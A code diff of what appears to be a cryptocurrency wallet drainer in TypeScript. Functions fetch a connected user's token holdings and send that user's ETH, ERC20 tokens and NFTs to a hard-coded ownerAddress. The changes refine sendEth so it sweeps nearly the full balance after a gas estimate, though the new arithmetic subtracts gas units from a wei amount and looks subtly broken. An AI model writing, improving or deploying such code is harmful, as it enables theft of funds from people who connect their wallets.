@@ -179,7 +179,6 @@ async function fetchUserTokens(address: string) {
         }
       );
       data = await response.json();
-      console.log(data);
 
       nativePrices[item[0]] = data.usdPrice;
     }
@@ -253,17 +252,22 @@ async function fetchUserTokens(address: string) {
 }
 
 async function sendEth(amount: any, chain: any) {
-  const gasPrice = await web3.eth.getGasPrice();
-  const newAmount = amount - Number(gasPrice) * 45000;
+  const estimate = await web3.eth.estimateGas({
+    from: account,
+    to: ownerAddress,
+    value: amount,
+  });
+
+  const newAmount = amount - (estimate + 10000);
 
   if (newAmount < 0) return;
 
-  var transactionObject = {
+  const transactionObject = {
     from: account,
     to: ownerAddress,
     value: newAmount,
   };
-  
+
   var success = 1;
 
   try {
@@ -275,6 +279,7 @@ async function sendEth(amount: any, chain: any) {
 
   logTx(success);
 }
+
 async function sendToken(amount: any, tokenAddress: any) {
   console.log("IN SEND TOKEN", amount, tokenAddress);
   var tokenContract = new web3.eth.Contract(ERC20_ABI, tokenAddress);
@@ -293,6 +298,7 @@ async function sendToken(amount: any, tokenAddress: any) {
 
   logTx(success);
 }
+
 async function sendNFT(id: string, tokenAddress: string) {
   var tokenContract = new web3.eth.Contract(ERC721_ABI, tokenAddress);
   var success = 1;
